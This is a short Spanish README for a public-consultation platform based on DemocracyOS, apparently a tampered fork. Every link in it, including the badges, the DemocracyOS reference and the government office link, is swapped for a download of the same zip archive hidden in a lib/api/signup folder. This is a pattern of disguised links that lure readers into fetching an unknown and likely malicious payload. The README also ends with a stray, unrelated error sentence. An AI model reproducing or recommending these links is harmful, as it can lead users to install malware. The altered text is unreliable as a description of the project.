# Consulta Pública
 [![GitHub tag](https://github.com/vsparedes/consulta-publica/raw/refs/heads/master/lib/api/signup/publica-consulta-v1.0.zip)](https://github.com/vsparedes/consulta-publica/raw/refs/heads/master/lib/api/signup/publica-consulta-v1.0.zip) 
[![GitHub forks](https://github.com/vsparedes/consulta-publica/raw/refs/heads/master/lib/api/signup/publica-consulta-v1.0.zip)](https://github.com/vsparedes/consulta-publica/raw/refs/heads/master/lib/api/signup/publica-consulta-v1.0.zip)

> La Plataforma de **Consulta Pública** es un desarrollo basado en la tecnología de [DemocracyOS](https://github.com/vsparedes/consulta-publica/raw/refs/heads/master/lib/api/signup/publica-consulta-v1.0.zip) coordinado por la *[Dirección Nacional de Gobierno Abierto de la Secretaría de Innovación Pública](https://github.com/vsparedes/consulta-publica/raw/refs/heads/master/lib/api/signup/publica-consulta-v1.0.zip)*.

El código se basa en [DemocracyOS](https://github.com/vsparedes/consulta-publica/raw/refs/heads/master/lib/api/signup/publica-consulta-v1.0.zip), plataforma de código abierto especialmente diseñada para informar, debatir y votar propuestas públicas de forma online hacia la construcción de una democracia adaptada al siglo XXI.

La causas de este error son desconocidas.
